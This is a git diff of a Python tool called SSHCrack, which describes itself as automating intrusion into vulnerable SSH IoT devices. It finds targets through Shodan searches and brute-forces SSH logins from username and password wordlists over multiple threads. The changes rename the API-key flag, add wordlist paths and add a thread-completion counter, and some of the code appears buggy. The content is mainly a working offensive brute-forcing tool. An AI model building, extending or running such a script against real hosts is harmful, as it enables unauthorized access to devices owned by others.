@@ -5,10 +5,6 @@
 # This script is designed to help automate the process of hacking into multiple vulnerable SSH IoT devices simultaneously
 
 
-# Splitting up tasks between threads
-# Stopping the scripts
-
-
 import shodan
 import threading
 import os
@@ -23,21 +19,24 @@ api = shodan.Shodan(shodanAPIKey)
 global ips
 ips = []
 
+global donenum
+donenum = 0
+
 def main(argv):
     apikey = "testing"
     target = ""
     iplist = ""
-    userlist = "usernames.txt"
-    passlist = "passwordlist.txt"
+    userlist = "wordlists\usernames.txt"
+    passlist = "wordlists\passwordlist.txt"
     users = []
     passwords = []
-    output = "output.txt"
+    output = "output\output.txt"
     multi = 1
     xmode = False
     verbose = False
 
     try:
-        opts, args = getopt.getopt(argv, "ha:t:i:u:p:o:m:xv", ["help", "apikey=" "target=", "iplist=", "userlist=", "passlist=", "output=", "multi=", "verbose"])
+        opts, args = getopt.getopt(argv, "hk:t:i:u:p:o:m:xv", ["help", "key=" "target=", "iplist=", "userlist=", "passlist=", "output=", "multi=", "verbose"])
     except getopt.GetoptError:
         print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
         print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
@@ -50,10 +49,11 @@ def main(argv):
         print("\033[0;31m       Disclaimer: Developers not liable or responsible")
         print("\033[0;31m       for misuse or damage caused by SSHCrack")
         print("\n")
-        print("\033[0musage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
+        print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
         print("\n")
         print("-h --help                     | Display help menu of arguments and command use")
         print("\n")
+        print("-k --key <api key>            | Enter your Shodan API key here to enable Shodan searches")
         print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
         print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
         print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
@@ -80,10 +80,11 @@ def main(argv):
             print("\033[0;31m       Disclaimer: Developers not liable or responsible")
             print("\033[0;31m       for misuse or damage caused by SSHCrack")
             print("\n")
-            print("\033[0musage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
+            print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
             print("\n")
             print("-h --help                     | Display help menu of arguments and command use")
             print("\n")
+            print("-k --key <api key>            | Enter your Shodan API key here to enable Shodan searches")
             print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
             print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
             print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
@@ -96,7 +97,7 @@ def main(argv):
             print("-v --verbose                  | Verbose mode - display everything going on")
             print("\n")
             sys.exit(0)
-        elif opt in ("-a", "--apikey"):
+        elif opt in ("-k", "--key"):
             apikey = arg
             #try:
             #    api = shodan.Shodan(apikey)
@@ -168,7 +169,7 @@ def main(argv):
     if multi > 1:
         MultiThreading(multi, users, passwords, output, verbose)
     else:
-        SSHConnect(users, passwords, output, verbose)
+        SSHConnect(multi, users, passwords, output, verbose)
 
 def search(target, xmode):
     ipaddr = []
@@ -183,7 +184,7 @@ def search(target, xmode):
                     ips.append (result["ip_str"])
             else:
                 continue
-        with open("Search_IP_Addresses.txt", "w") as f:
+        with open("output\IP_Addresses.txt", "w") as f:
             f.write("\n".join(ipaddr))
 
     except shodan.APIError as error:
@@ -197,11 +198,11 @@ def MultiThreading(multiNum, userList, passList, output, verbose):
         for i in range(multiNum):
             if verbose:
                 print("Creating thread " + str(i))
-            threading.Thread(target=SSHConnect, args=(x[i], y[i], output, verbose)).start()
+            threading.Thread(target=SSHConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
     except OSError as error:
         print("Error: {}".format(error))
 
-def SSHConnect(userList, passList, output, verbose):
+def SSHConnect(multiNum, userList, passList, output, verbose):
     client = paramiko.SSHClient()
     client.load_system_host_keys()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -227,12 +228,23 @@ def SSHConnect(userList, passList, output, verbose):
             if breakout:
                 break
     
-    print("\nCracking completed")
+    print("\nThread cracking completed")
+    done_counter(multiNum)
     sys.exit(0)
 
 def divide_list(list, num):
-    for i in range(0, len(list), num):
-        yield list[i:i + num]
+    k, m = divmod(len(list), num)
+    return (list[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(num))
+
+def done_counter(multiNum):
+    donenum += 1
+    if donenum >= multiNum:
+        try:
+            print("\n(-) All Cracking Done (-)")
+            sys.exit(0)
+        except Exception:
+            print(Exception)
+            sys.exit(2)
 
 if __name__ == "__main__":
     main(sys.argv[1:])
